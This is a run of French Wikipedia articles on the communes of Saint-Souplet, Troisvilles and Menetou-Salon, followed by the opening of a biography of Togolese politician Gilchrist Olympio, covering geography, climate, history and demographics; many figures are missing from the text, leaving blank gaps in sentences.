Situé au sud du Cateau-Cambrésis et au seuil de l'Avesnois, le village de Saint-Souplet est entouré par les paysages naturels du Hainaut : prairies bordées de haies bocagères et vastes étendues de champs cultivés. Il s'étend le long de la Selle, rivière qui prend sa source à Molain dans l'Aisne et serpente sur près de 50 kilomètres dans le Département du Nord. De nombreuses espèces d'arbres sont présentes sur ses berges, que domine l'église de briques du village. Elle dispose également d'un hameau important sur son territoire, La-Haie-Menneresse.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par la Selle ou Escaut.
La Selle, d'une longueur de , prend sa source dans la commune de Molain et se jette dans le canal de l'Escaut à Denain, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Saint-Hilaire-sur-Helpe à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Saint-Souplet est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction du Cateau-Cambrésis, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (90,4 % en 2018), en diminution par rapport à 1990 (91,3 %). La répartition détaillée en 2018 est la suivante : 
terres arables (69,1 %), prairies (16,7 %), zones urbanisées (6,4 %), zones agricoles hétérogènes (4,7 %), forêts (3,1 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Le village est mentionné sous les noms de "Sanctus Sulpicius" en 1151 dans le cartulaire de l'abbaye de Vaucelles, "Saint Souplec" en 1155, "Sanctus Supplicius" en 1349. Selon Boniface il porta d'abord le nom de "Pomeriolæ" ou "Pomereuil". Il doit son nom à Sulpice, son saint patron.
Histoire.
Saint-Souplet doit donc son nom à son patron saint Sulpice le Pieux archevêque de Bourges au dont il n'est qu'une corruption. Ce n'est pas le seul nom que la localité ait porté. Si l'on en croit le chroniqueur Baldéric, chantre de Thérouanne au , après son supplice en 670, sainte Maxellende de Caudry fut inhumée dans l'église du village, qui s'appelait alors "Sanctus Sulpitius Pomeriolas", Saint-Sulpice-Pommereul.
Le bréviaire parle en ces termes du lieu de sépulture de sainte Maxellende : "Sepulta primum in basilica beatorum Petri et Pauli et Sancti Sulpitii apud Villam cui nomen Pomeriolas - ensevelie en premier lieu dans la basilique des bienheureux Pierre et Paul et saint Sulpice près du domaine nommé Pomeriolas". Cette juxtaposition nous laisse supposer que le nom primitif de la localité était Pomeriolas.
Ce nom de Pomeriolas vient du latin "pommorum brolium", qui signifie "la pommeraie". Selon Alexandre-Guillaume Chotin les villages du Pommereuil situé à 11 km de Saint Souplet et de Pommerœul dans le Hainaut belge ont la même étymologie. Ceci permet de penser que la localité tient son origine de l'époque gallo-romaine. Cette hypothèse est renforcée par la mention du bréviaire ci-dessus qui parle d'une villa, c'est-à-dire d'un domaine foncier, en somme d'une ferme gallo-romaine.
Au , du temps de Maxellende, ce domaine appartenait à une très riche veuve nommée Amaltrude qui finit par en faire don à l'évêque de Cambrai Vindicien.
Le nom de Saint-Souplet prévaut définitivement dès le où nous le voyons porté par une illustre famille originaire de Saint-Souplet et à laquelle appartenait Guillaume, seigneur de Saint-Souplet en 1151.
Saint-Souplet eut son importance au début de l'histoire de France. Elle faisait la limite du Pays des Nerviens célèbres pour leurs luttes avec les armées romaines. Une chaussée gauloise la traverse dans toute son étendue, longeant la rivière la Selle jusqu'aux sources de l'Oise. Au , Charlemagne lui confirme ses immunités et ses privilèges. Saint-Souplet eut ses châteaux au Moyen Âge, dont deux châteaux forts qui furent assiégés, pris et détruits par Louis XIII en guerre avec l'Espagne. Il n'en reste aucune trace.
En 1272, Enguerrand de Coucy vendit la Seigneurie à Marguerite II Comtesse de Flandre.
En 1283, Guillaume II Comte de Flandre en fait hommage à l'évêque de Cambrai.
En 1336, Philippe de Valois Roi de France l'achète.
Au traité de Conflans le , Louis XI la céda à Charles comte de Charolais avec les villes de la Somme.
Après son retour au royaume Louis XII la donna au seigneur de la Grüthuse.
En 1566, un pasteur protestant fut arrêté à Saint-Souplet. Le Cambrésis et le Vermandois voisin ont accueilli la Réforme avec un certain enthousiasme. Notre village ne semble pas avoir fait exception. Le jour de la Pentecôte 1566, un ancien prêtre catholique nommé Jacques Grégoire, un des ministres de l'Église réformée de Tupigny, à 16 km de Saint-Souplet, était venu célébrer le culte chez un habitant pour les villageois professant la foi protestante. Le temps de la tolérance n'était pas encore venu, le mayeur et les échevins l'arrêtèrent et le conduisirent au Cateau-Cambrésis, où il fut emprisonné avant d'être transféré à Cambrai.
Le , par lettres données à Madrid, Philippe d'Anneux, chevalier, baron de Crèvecœur, premier pair en Cambrésis, châtelain héréditaire de Cambrai, seigneur d'Abancourt, Rumilly, Saint-Souplet, Fontaine-au-Pire, etc., gouverneur d'Avesnes, bénéficie de l'érection de la terre et seigneurie de Grand-Wargnies en marquisat, en y joignant les seigneuries de Boussois-sur-Sambre (Boussois) et Bual en Hainaut.
En 1789, au seuil de la Révolution française, le village appartenait au marquis de Wargnies de la famille d'Anneux.
En 1791, le curé Jean-François Dagneau, né à Iwuy en 1714 et installé à Saint-Souplet le , refusa de prêter le serment à la constitution civile du clergé. Il fut déposé de sa fonction, mais il passa une retraite paisible dans la paroisse, où il mourut le (15 fructidor an IV), âgé de 82 ans. Le dernier acte, un baptême, qu'il signa aux registres paroissiaux est daté du . Le curé constitutionnel Jacques Antoine Dollé fut rapidement nommé à la place de monsieur Dagneau, il signa l'acte d'une inhumation le . Une rue du village porte son nom jusqu'à nos jours.
Durant la Première Guerre mondiale, la bataille de la Selle eut lieu les 17 et à Saint-Souplet. La Selle, affluent de l'Escaut aux eaux vives et tumultueuses, long de 37 km, constitua un obstacle majeur pour les Alliés lors de leur offensive, faisant du Cateau un bastion difficile à enlever. Les dégâts et pertes en vies humaines sont lourds. Les cimetières du Catésis en portent aujourd'hui l'amer témoignage.
Durant la Seconde Guerre mondiale, Saint-Souplet fit partie, dès janvier 1943, du fameux maquis de Mazinghien, groupe très organisé de 300 résistants, qui depuis une dizaine de communes limitrophes du Nord et de l'Aisne menèrent la vie dure à l'ennemi jusqu'à la Libération. Beaucoup d'actions d'éclat sont à leur actif.
En 1973, elle absorbe Escaufourt, située auparavant dans l'Aisne. La commune prend le nom de Saint-Souplet-Escaufourt.
Politique et administration.
Maire de 1802 à 1807 : Jacq. Rousseau.
Maire en 1881 : Delay.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 37,5 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 24,5 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,38 % d'hommes, largement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Linguistique.
Il y a quelques dizaines d'années, les anciens du village parlaient encore un dialecte appartenant à l'aire linguistique du picard du Nord. Étant donné la situation géographique limitrophe de la localité, le parler local a subi des influences des parlers du Vermandois, du Hainaut et de la Thiérache. Les villages voisins de Saint-Martin-Rivière et de Saint-Benin parlaient le même dialecte sans variation. En revanche le parler d'Escaufourt connaissait des légères différences, comme l'imparfait en "eut" plutôt qu'en "ot" : i diseut / i disot.
Contrairement aux idées reçues, le picard n'est pas une déformation du français, mais bien une langue à part entière. De nos jours, bien peu de personnes sont capables de parler picard correctement et ceux qui croient s'exprimer en « ch'ti » dans le village, fabriquent un affreux mélange de français et de langue locale. On ne peut que le regretter, car lorsqu'une langue meurt, c'est une culture qui disparaît.
I falot qu'cha fuche dit !
Escaufourt.
Le nom d'Escaufourt viendrait de "fours à chaux". Au , Escaufourt était de la paroisse d'Honnechy. Avant la fusion avec la commune de Saint-Souplet en 1973, Escaufourt était une enclave de l'Aisne dans le Nord. Le nom jeté des habitants d'Escaufourt est les "Grosses Tiètes" (les grosses têtes).
Personnalités liées à la commune.
Escaufourt fut marqué par ses instituteurs, secrétaires de mairie. Tout d'abord M. Raimbaut, puis M. Amédée Soufflet (1920-1981) qui est resté, ainsi que son épouse, de 1945 à 1967 dans cette petite commune de l'Aisne.

</doc>
<doc id="191669" url="https://fr.wikipedia.org/wiki?curid=191669" title="Troisvilles">
Troisvilles

Troisvilles est une commune française située dans le département du Nord, en région Hauts-de-France.
Géographie.
Situation.
Troisvilles est située entre Caudry et Le Cateau-Cambrésis.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par l'Erclin, le Torrent d'Esnes et le Riot du Fay.
L'Erclin, d'une longueur de , prend sa source dans la commune de Maurois et se jette dans l'Escaut canalisée à Thun-Saint-Martin, après avoir traversé .
Le Torrent d'Esnes, d'une longueur de , prend sa source dans la commune de Bertry et se jette dans la rivière Escaut à Crèvecœur-sur-l'Escaut, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Troisvilles est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Caudry, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (92 % en 2018), en diminution par rapport à 1990 (93,2 %). La répartition détaillée en 2018 est la suivante : 
terres arables (69,9 %), prairies (22,1 %), zones urbanisées (8 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Le lieu est mentionné sous le nom de "Tres Villæ", "Troisvilles" en 1582. Le village est formé de la réunion de trois seigneuries ou « villes » : Euvillaria (1214) ou Euvilers (1450) (aujourd'hui Le Villers) ; Le Fayt (aujourd'hui Le Fay) ; Le Sautier ou La Sautière (aujourd'hui La Sotière).
Depuis 1582, Troisvilles s'écrit en un seul mot (d'après un manuscrit de la bibliothèque de
Cambrai, n° : 670).
Histoire.
À l'époque médiévale, trois seigneuries se partagent le territoire actuel : celle de la Sotière, celle du Fayt et celle du Villers. Ce sont encore aujourd'hui le nom des trois rues principales. Réunies, elles forment ensuite Troisvilles.
L'autel d'Euvillers fut concédé aux chanoines de l'église Saint-Aubert de Cambrai par l'évêque de Cambrai Liébert en 1057.
À la fin du , Ferry-Nicolas d' Esclaibes, issu d'une branche cadette de la maison d'Esclaibes de Clairmont, est seigneur d'Amerval (hameau de Solesmes), du Fayt en Troisvilles, de Hellies, de la Mairie de Thumeries, du Bois en Phalempin et des Deux Treilles dans la châtellenie de Lille. Fils de Nicolas d'Esclaibes, chevalier, seigneur d'Amerval, et d'Agnès-Thérèse de la Hamayde, il a pour grand-père Georges d'Escalibes, seigneur d'Amerval et de Helgies. Il épouse à Lille le , Marie Taviel, fille de François-Eustache Taviel du Moulinel, chevalier, seigneur du Moulinel, de Bois-Grenier, Bourghelles, substitut du procureur du roi et de Catherine de la Haye.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 36,3 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 24,6 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,24 % d'hommes, largement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191670" url="https://fr.wikipedia.org/wiki?curid=191670" title="Menetou-Salon">
Menetou-Salon

Menetou-Salon est une commune française située dans le département du Cher en région Centre-Val de Loire.
Menetou-Salon est une commune rurale qui compte en , après avoir connu un pic de population de en 1806. Elle fait partie de l'aire d'attraction de Bourges.
Le patrimoine architectural de la commune comprend un immeuble protégé au titre des monuments historiques : le château, reconstruit en style néogothique entre 1884 et 1890 en s’inspirant de l’hôtel Jacques-Cœur, inscrit en 1989 (façades et toitures ; pièces majeures et chapelle). 
Géographie.
Voies de communication et transports.
Voies routières.
La commune est à de la route départementale 940 en venant de Bourges.
L'autoroute A71 (axe Paris – Clermont-Ferrand) est à par le contournement ouest de Bourges.
Les routes départementales desservant Menetou-Salon sont :
Transport ferroviaire.
La gare de Bourges est à par la route de Fussy.
Transport en commun.
Menetou-Salon est desservie par la ligne 105 des transports du département du Cher (Henrichemont – Bourges).
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols, etc.) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Centre et contreforts nord du Massif Central, caractérisée par un air sec en été et un bon ensoleillement. Elle est en outre dans la zone H2b au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de La Chapelle-d'Angillon à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Pour afficher une liste d’indicateurs climatiques caractérisant la commune aux horizons 2030, 2050 et 2100 et pouvoir ainsi s'adapter aux changements climatiques, entrer son nom dans Climadiag-commune, un site de Météo-France élaboré à partir des nouvelles projections climatiques de référence DRIAS-2020.
Urbanisme.
Typologie.
Au , Menetou-Salon est catégorisée bourg rural, selon la nouvelle grille communale de densité à définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Bourges, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d’occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (67,9 % en 2018), en diminution par rapport à 1990 (70,2 %). La répartition détaillée en 2018 est la suivante :
terres arables (28,3 %), forêts (28,1 %), prairies (25 %), cultures permanentes (8 %), zones agricoles hétérogènes (6,6 %), zones urbanisées (3,6 %), eaux continentales (0,3 %).
L'évolution de l’occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Risques majeurs.
Le territoire de la commune de Menetou-Salon est vulnérable à différents aléas naturels : météorologiques (tempête, orage, neige, grand froid, canicule ou sécheresse), mouvements de terrains et séisme (sismicité faible). Il est également exposé à un risque technologique, le transport de matières dangereuses. Un site publié par le BRGM permet d'évaluer simplement et rapidement les risques d'un bien localisé soit par son adresse soit par le numéro de sa parcelle.
Risques naturels.
La commune est vulnérable au risque de mouvements de terrains constitué principalement du retrait-gonflement des sols argileux. Cet aléa est susceptible d'engendrer des dommages importants aux bâtiments en cas d’alternance de périodes de sécheresse et de pluie. 93,7 % de la superficie communale est en aléa moyen ou fort (90 % au niveau départemental et 48,5 % au niveau national). Sur les dénombrés sur la commune en 2019, 746 sont en aléa moyen ou fort, soit 85 %, à comparer aux 83 % au niveau départemental et 54 % au niveau national. Une cartographie de l'exposition du territoire national au retrait gonflement des sols argileux est disponible sur le site du BRGM.
Concernant les mouvements de terrains, la commune a été reconnue en état de catastrophe naturelle au titre des dommages causés par la sécheresse en 1989, 2018 et 2019 et par des mouvements de terrain en 1999.
Risques technologiques.
Le risque de transport de matières dangereuses sur la commune est lié à sa traversée par des infrastructures routières ou ferroviaires importantes ou la présence d'une canalisation de transport d'hydrocarbures. Un accident se produisant sur de telles infrastructures est en effet susceptible d’avoir des effets graves au bâti ou aux personnes jusqu’à , selon la nature du matériau transporté. Des dispositions d’urbanisme peuvent être préconisées en conséquence.
Histoire.
Origine du nom.
Le toponyme actuel est désigné au par (« petit monastère de Sarlon ») aussi dénommé . Ce nom fait expressément allusion à la fondation près du château seigneurial, vers 1075, du prieuré Saint-Martin par Sarlon, seigneur de Ménetou et Quantilly membre d'une famille noble influente auprès du vicomte de Bourges.
Antiquité.
Après la conquête de la Gaule par les légions de Jules César, Avaricon est reconstruite et devient "Avaricum". Pour alimenter en eau les fontaines monumentales et les thermes de la nouvelle cité, un des aqueducs est construit depuis la "fontaine Saint-Jacques" située sur le territoire actuel de Menetou-Salon.
À la Motte-Robert, un ferrier arasé, daté de cette époque, a été mis en évidence sur une surface de près d’un hectare.
Moyen Âge.
En 1097, le seigneur de Ménetou, Sarlon le Riche, ayant décidé d’accompagner à la Première croisade le vicomte de Bourges, Eudes Arpin/ , donne l’église Saint-Pierre de Ménetou, avec ses revenus, à l’abbaye Saint-Sulpice-lez-Bourges de l'ordre de Saint-Benoît.
En 1190, Hugues de Vesvre, seigneur de Menetou, donne des terres à l’abbaye Notre-Dame de Loroy toute proche (actuellement sur la commune de Méry-ès-Bois) fondée en 1125 par le seigneur de Sully, la Chapelle et les Aix.
En 1259, Hervé III, seigneur de Vierzon, donne la seigneurie de Menetou-Salon à sa sœur ou nièce Marie de Vierzon à l’occasion du mariage de cette dernière avec Jean de Sancerre. Robert de Sancerre (mort entre 1271 et 1301), fils cadet ou frère de ce dernier, obtient la seigneurie de Menetou-Salon.
En 1384, Arnould de Bonnay, marié à Isabeau de Sancerre dame de Menetou, seigneur de Quantilly, peut se prévaloir par son mariage du titre de seigneur de Menetou.
Vers 1450, Jacques Cœur achète les terres et le château de Menetou. Dans les années qui suivent, le grand argentier tombe en disgrâce et ses biens sont saisis par le roi Charles VII. Ce dernier cède pour d’or cette seigneurie à sa favorite du moment, Antoinette de Maignelais, devenue dame de Villequier par son mariage avec André de Villequier.
En 1513, Artus de Villequier vend pour la terre de Ménetou à dame Jeanne de Malet-Graville, veuve en 1511 du maréchal Charles d’Amboise et morte en 1546 sans postérité survivante.
En 1532, Claude d'Urfé, surintendant de la Maison du roi François II, épouse Jeanne de Balzac d’Entragues, dame de Menetou et devient ainsi seigneur de Menetou-Salon.
En 1559, à la mort de Claude d’Urfé, son beau-frère Jean Pot seigneur de Rhodes en bas Berry achète à Jacques d’Urfé la châtellenie de Menetou-Salon.
En 1590, sont regroupées deux entités jusque-là distinctes : la seigneurie de la Chaintre qui dépendait du seigneur de Mehun-sur-Yèvre et qui était soumise à la taille, et la partie située autour du château de Menetou appelée "le fief Pot" (ou "fief de Pot") qui dépendait de la principauté souveraine de Boisbelle, dont les habitants jouissaient de conditions très avantageuses en matière d’impôts et d’obligations militaires.
En 1619, à l’issue d’un procès sommaire devant la cour souveraine de Boisbelle, un mendiant, Gilbert Fourneau, est arrêté, convaincu de sorcellerie et condamné à mort. Après avoir fait amende honorable au porche de l’église Saint-Pierre de Ménetou, il est pendu puis brûlé sur place.
Sous l'Ancien Régime, les catholiques de Menetou-Salon disposent de trois lieux de culte : l'église paroissiale Saint-Pierre, le prieuré de Saint-Martin et la chapelle du château. La paroisse est rattachée à l'archiprêtrie de Bourges.
À l'occasion de plusieurs mariages, la terre de Menetou va en peu de temps voir plusieurs maisons nobiliaires se succéder à sa tête. Ainsi :
En 1801, sous le Consulat et Napoléon Bonaparte est instauré à Menetou-Salon un tribunal appelé « justice de paix » pour régler les conflits de voisinage apparus sur les communes d'Allogny, de Fussy, de Menetou, de Pigny, de Quantilly, de Saint-Éloy-de-Gy, de Saint-Georges-sur-Moulon, de Saint-Palais, de Saint-Martin-d'Auxigny, de Vasselay et de Vignoux-sous-les-Aix.
En 1817, sous le règne de Louis XVIII et la Restauration française, le siège de la Justice de paix est transféré à Saint-Martin-d’Auxigny.
Vers 1824, un vaste incendie détruit 104 maisons à Menetou-Salon ; l’archevêque de Bourges, , ordonne des quêtes dans son diocèse pour porter secours aux sinistrés.
Dans les années 1830, sous la monarchie de Juillet et le roi , la commune de Menetou-Salon est caractérisée par des activités de tissage de serge, d’huilerie de noix, de commerce de bois et bien sûr de production de vins (dont une partie alimente une distillerie) ; si l’on recherche des fabrications de taillandier ou un instrument aratoire, ils sont produits sur place. Mais l'essor de ces activités est freiné par la vétusté et la lenteur des transports avec la seule traction à cheval : diligences et charrettes. De plus, les routes sont peu praticables en certaines saisons et dans les lieux reculés.
En 1867, sous le Second Empire et l'empereur Napoléon III, l’église de Menetou-Salon est reconstruite.
La deuxième partie du voit partout en France l’essor du chemin de fer. L’objectif visé est que toutes les préfectures et les sous-préfectures soient rapidement reliées par le rail. Au début du siècle suivant, les trois quarts des cantons le seront également au moyen de chemins de fer départementaux ou de tramways (parfois à voie métrique, parfois à écartement plus faible encore : et même ). Menetou-Salon va également être touché par ce bienfait voulu expressément par les autorités républicaines pour rallier les citoyens au nouveau régime politique. Dès 1860, le vin de Menetou commence à être vendu à Paris. Puis, dans les années 1880, est entreprise la construction de la ligne Bourges – Aubigny – Argent – Sully – Orléans ou Paris via Pithiviers (ligne exploitée jusqu’en 1938 par la Compagnie du chemin de fer de Paris à Orléans) (ou « P.O » dans le langage quotidien) puis par la SNCF après 1938).
En 1877, le prince Auguste d’Arenberg (1837-1924), déjà conseiller général du canton de Saint-Martin-d’Auxigny, est élu député monarchiste du Cher, au suffrage universel masculin ; il occupera cette fonction jusqu'en 1902.
En 1878, sous la Troisième République, sont édifiées la mairie et les écoles primaires de la commune.
1881 est une année noire pour la viticulture du centre de la France. À son tour, en effet, le Cher subit une grave crise économique agricole provoquée par la progression du phylloxéra, mais les viticulteurs de Menetou-Salon font face collectivement au désastre en créant un syndicat viticole en 1890 et en replantant de nouveaux cépages plus résistants.
Le château de Menetou-Salon est restauré et agrandi vers 1885 par le prince Auguste d’Arenberg, président de la Compagnie du canal de Suez, député du Cher.
Après la Première Guerre mondiale, le chemin de fer se trouve rapidement concurrencé par la route, du fait des considérables progrès techniques intervenus : dans le réseau routier, en particulier avec le goudronnage généralisé, ainsi que sur les automobiles et les camions.
Le monument aux morts est érigé le en l’honneur des nombreux poilus de la commune de Menetou-Salon tués au cours de la Première Guerre mondiale.
Le , la gare de Menetou voit passer le « train fou » vidé de toute présence humaine par les maquisards et lancé par la Résistance intérieure française en direction du nœud ferroviaire de Bourges pour empêcher les armées du troisième Reich d’utiliser le rail et de s’opposer aux conséquences du débarquement de Normandie ou pour battre en retraite rapidement vers l’Allemagne. Contre toute attente, cette action spectaculaire de la « bataille du rail » ne fit aucun dégât.
Après la Seconde Guerre mondiale et la reconstruction du pays, le rail connaît quelques années de répit mais les lignes d’intérêt local ou régional voient rapidement baisser leur trafic. Le remplacement des locomotives à charbon par des autorails ou des loco-tracteurs à moteur à essence ou à moteur diésel n’inversent pas la tendance.
En 1950, la gare de Menetou cesse d’accueillir les voyageurs et, vingt ans plus tard, les marchandises. Enfin, la ligne de chemin de fer desservant Menetou-Salon fait l’objet d’une mesure de « retranchement » et de « déclassement » en .
Politique et administration.
La commune fait partie du canton de Saint-Martin-d'Auxigny, même après le redécoupage des cantons en 2015.
Population et société.
Évolution démographique.
Indicateurs démographiques.
Pour les périodes 1990-1999 et 1999-2010 :
Pyramide des âges.
La population de la commune est relativement âgée.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 26,4 %, soit en dessous de la moyenne départementale (30,2 %). À l'inverse, le taux de personnes d'âge supérieur à est de 35,7 % la même année, alors qu'il est de 32,7 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,52 % de femmes, légèrement inférieur au taux départemental (51,56 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Économie.
Le vignoble de Menetou-Salon est cependant un vignoble très ancien d'après les vieux écrits et documents concernant la seigneurie et châtellenie de Menetou-Salon.
Ce vignoble renommé s’étend sur de collines. L’aire d’appellation couvre dix communes dont Menetou-Salon, Aubinges, Humbligny, Morogues, Parassy, Quantilly, Saint-Céols, Soulangis, Vignoux-sous-les-Aix.
Tous les ans, au mois d'août, une manifestation "Caves ouvertes" est organisée un week-end par les vignerons eux-mêmes : dégustation, échanges avec les professionnels, démonstration de chauffage des tonneaux..
Emploi et population active.
En 2010, parmi les que compte la commune, sont âgés de 15 à 64 ans et (soit très approximativement les trois quarts) sont actifs (698, soit 68,8 %, ont un emploi).
Au sens du recensement, la commune comptait 63 chômeurs (soit un taux de chômage de 8,3 %).
Toujours en 2010, on comptait 397 emplois (dont 295 salariés) ; 703 actifs avaient un emploi résidant dans la zone.

</doc>
<doc id="191672" url="https://fr.wikipedia.org/wiki?curid=191672" title="Gilchrist Olympio">
Gilchrist Olympio

Gilchrist Olympio, surnommé « le maréchal », est un homme politique togolais. Fils du père de l'indépendance Sylvanus Olympio et longtemps opposant au régime dictatorial de Gnassingbé Eyadema, il est président de l'Union des forces de changement, un parti politique allié au régime depuis 2010 dans un accord de gouvernement.
Biographie.
Famille et origine.
Gilchrist Olympio est né le à Lomé, fils de Dina et Sylvanus Olympio, il est le troisième d'une fratrie de cinq enfants. Il est marié et père d'une fille.
Descendant d'une grande famille métisse de l'élite Éwé du sud du Togo et du Ghana, son grand-père d'origine brésilienne, Epiphanio Elpidio Olympio, était un riche commerçant. Son père Sylvanus Olympio, homme politique, figure emblématique de la lutte pour l'indépendance du Togo et premier président de la République indépendante du Togo, est mort assassiné lors du coup d'État de 1963.
Éducation.
Gilchrist Olympio fait ses études primaires à l’école de la mission catholique Notre-Dame du Sacré-Cœur de Lomé puis les études secondaires à Accra à l'école secondaire d’Achimota (anciennement appelée « Princes of Wales College »).
